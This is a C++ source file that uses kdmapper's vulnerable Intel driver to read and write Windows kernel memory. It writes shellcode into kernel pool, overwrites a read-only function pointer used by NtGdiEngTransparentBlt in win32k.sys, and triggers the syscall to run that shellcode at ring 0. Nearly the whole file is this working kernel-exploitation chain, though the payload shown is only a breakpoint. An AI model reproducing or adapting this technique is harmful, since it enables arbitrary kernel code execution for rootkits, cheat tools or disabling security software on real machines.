#include "../kdmapper/kdmapper/intel_driver.hpp"
#include "offsets/offset.h"

namespace offset
{
	namespace _HANDWRITTEN
	{
		// mov  r10, rcx				; 0x3			; 49 89 ca
		// mov  eax, <DWORD>			; 0x1			; b8 <DWORD>
		const s_field NtGdiEngTransparentBlt_SyscallID = { .byte = 0x3 + 0x1, .bytes = 0x4, .bit = 0x0 , .bits = 0x0 };
		// rex  push rbx				; 0x2			; 40 53
		// sub  rsp, 0x50				; 0x4			; 48 83 ec 50
		// mov  rax, [rip + <DWORD>]	; 0x3			; 48 8b 05 <DWORD>
		const s_field NtGdiEngTransparentBlt_RipGate = { .byte = 0x2 + 0x4 + 0x3, .bytes = 0x4, .bit = 0x0 , .bits = 0x0 };
		// rex  push rbx				; 0x2			; 40 53
		// sub  rsp, 0x50				; 0x4			; 48 83 ec 50
		// mov  rax, [rip + 0x5aff7]	; 0x3 + 0x4		; 48 8b 05 f7 af 05 00
		// RIP:
		const s_field NtGdiEngTransparentBlt_Rip = { .byte = 0x2 + 0x4 + 0x3 + 0x4, .bytes = 0x0, .bit = 0x0 , .bits = 0x0 };
	}
}

unsigned char R0_Callgate_Buf[2] = { 0xCC, 0xC3 };
// int 3h
// ret

int main(const int argc, char* argv[])
{
	if (argc == 1337)
		MessageBoxA(nullptr, "world", "hello", MB_OK);
	
	const auto pid = GetCurrentProcessId();
	printf("   PID = %lx" "\n", pid);
	if (!pid) return 0;

	const auto win32u = GetModuleHandleA("win32u.dll");
	printf("R3 win32u = %p" "\n", win32u);
	if (!win32u) return 0;

	const auto NtGdiEngTransparentBlt = static_cast<void*>(GetProcAddress(win32u, "NtGdiEngTransparentBlt"));
	printf("R3 NtGdiEngTransparentBlt = %p" "\n", NtGdiEngTransparentBlt);
	if (!NtGdiEngTransparentBlt) return 0;
	
	const auto SyscallID = *static_cast<PDWORD>(ptr_field(offset::_HANDWRITTEN::NtGdiEngTransparentBlt_SyscallID, NtGdiEngTransparentBlt));
	printf("R3 SyscallID = %lx" "\n", SyscallID);
	if (!SyscallID) return 0;

	const auto teb = NtCurrentTeb();
	printf("R3 teb = %p" "\n", teb);
	if (!teb) return 0;
	
	const auto GdiBatchCount = ptr_field(offset::_TEB::GdiBatchCount, teb);
	printf("R3 GdiBatchCount = %p" "\n", GdiBatchCount);
	if (!GdiBatchCount) return 0;

	// Find win32k.sys Modul-Base
	const auto win32k = reinterpret_cast<void*>(utils::GetKernelModuleAddress("win32k.sys"));
	printf("R0 win32k = %p" "\n", win32k);
	if (!win32k) return 0;

	// Calculate NtGdiEngTransparentBlt Address
	const auto R0_NtBlt = ptr_field(offset::_PUBLIC::NtGdiEngTransparentBlt, win32k);
	printf("R0 NtGdiEngTransparentBlt = %p" "\n", R0_NtBlt);
	if (!R0_NtBlt) return 0;

	// Calculate Callgate-Address-Calculation-RIP
	const auto R0_NtGdiEngTransparentBlt_RIP = adr_field(offset::_HANDWRITTEN::NtGdiEngTransparentBlt_Rip, R0_NtBlt);
	printf("R0 NtGdiEngTransparentBlt RIP = %llx" "\n", R0_NtGdiEngTransparentBlt_RIP);
	if (!R0_NtGdiEngTransparentBlt_RIP) return 0;

	// Calculate Callgate RIP Offset-Pointer
	const auto R0_NtBlt_RIP_GATE_OFFSET_PTR = adr_field(offset::_HANDWRITTEN::NtGdiEngTransparentBlt_RipGate, R0_NtBlt);
	printf("R0 NtGdiEngTransparentBlt RIP GATE OFFSET PTR = %llx" "\n", R0_NtBlt_RIP_GATE_OFFSET_PTR);
	if (!R0_NtBlt_RIP_GATE_OFFSET_PTR) return 0;

	printf(" > Load Intel Driver" "\n");
	
	const HANDLE hDev = intel_driver::Load();
	printf("   hDev = %p" "\n", hDev);
	if (!hDev || hDev == INVALID_HANDLE_VALUE) return 0;

	const auto Unload = [](const HANDLE hDrv) -> int
	{
		intel_driver::Unload(hDrv);
		return 0;
	};

	printf(" > Readback Callgate RIP Offset" "\n");

	// Readback Callgate RIP Offset
	uint64_t R0_NtBlt_RIP_GATE_OFFSET = 0x0;
	intel_driver::ReadMemory(hDev,
		R0_NtBlt_RIP_GATE_OFFSET_PTR,
		static_cast<void*>(&R0_NtBlt_RIP_GATE_OFFSET),
		min(offset::_HANDWRITTEN::NtGdiEngTransparentBlt_RipGate.bytes, sizeof(R0_NtBlt_RIP_GATE_OFFSET)));
	printf("R0 NtGdiEngTransparentBlt RIP GATE OFFSET = %llx" "\n", R0_NtBlt_RIP_GATE_OFFSET);
	if (!R0_NtBlt_RIP_GATE_OFFSET) return Unload(hDev);

	// Calculate Callgate-Pointer Address
	const auto R0_NtBlt_RIP_GATE_PTR = R0_NtGdiEngTransparentBlt_RIP + R0_NtBlt_RIP_GATE_OFFSET;
	printf("R0 NtGdiEngTransparentBlt RIP GATE PTR = %llx" "\n", R0_NtBlt_RIP_GATE_PTR);
	if (!R0_NtBlt_RIP_GATE_PTR) return Unload(hDev);

	printf(" > Readback Callgate Pointer" "\n");
	
	// Readback Callgate-Pointer
	uint64_t R0_NtBlt_RIP_GATE = 0x0;
	intel_driver::ReadMemory(hDev,
		R0_NtBlt_RIP_GATE_PTR,
		static_cast<void*>(&R0_NtBlt_RIP_GATE),
		sizeof(R0_NtBlt_RIP_GATE));
	printf("R0 NtGdiEngTransparentBlt RIP GATE = %llx" "\n", R0_NtBlt_RIP_GATE);
	if (!R0_NtBlt_RIP_GATE) return Unload(hDev);
	
	printf(" > Allocate/Write Shellcode" "\n");
	
	// Allocate Kernel-Memory
	auto R0_Callgate_PTR = intel_driver::AllocatePool(hDev,
		nt::POOL_TYPE::NonPagedPool,
		sizeof(R0_Callgate_Buf));
	if (!R0_Callgate_PTR) return Unload(hDev);

	// Write Shellcode to allocated Kernel-Memory
	if (!intel_driver::WriteMemory(hDev,
		R0_Callgate_PTR,
		R0_Callgate_Buf,
		sizeof(R0_Callgate_Buf))) return Unload(hDev);
	printf("R0 Shellcode = %llx" "\n", R0_Callgate_PTR);

	printf(" > Overwrite Gate Pointer" "\n");
	
	// Overwrite Callgate-Pointer with Shellcode-Address
	if (!intel_driver::WriteToReadOnlyMemory(hDev,
		R0_NtBlt_RIP_GATE_PTR,
		static_cast<void*>(&R0_Callgate_PTR),
		sizeof(uint64_t))) return Unload(hDev);

	printf(" > Call GDI-Syscall" "\n");
	Sleep(1000);
	
	if (const auto p = static_cast<unsigned int*>(GdiBatchCount); (*p) == 0)
	{
		(*p) = 1337;

		static_cast<int64_t(*)(
			int64_t _rcx, int64_t _rdx, int64_t _r8, int64_t _r9,
			int64_t _ebp_16, int64_t _ebp_24,
			int32_t _ebp_32, int32_t _ebp_36)>(NtGdiEngTransparentBlt)(
				1, 2, 3, 4,
				5, 6,
				7, 8);

		(*p) = 0;
	}

	printf(" > Reset Gate Pointer" "\n");

	// Overwrite Callgate-Pointer with Original-Address
	if (!intel_driver::WriteToReadOnlyMemory(hDev,
		R0_NtBlt_RIP_GATE_PTR,
		static_cast<void*>(&R0_NtBlt_RIP_GATE),
		sizeof(uint64_t))) return Unload(hDev);

	printf(" > Free Shellcode" "\n");
	
	if (!intel_driver::FreePool(hDev, R0_Callgate_PTR))
		return Unload(hDev);

	return Unload(hDev);
}
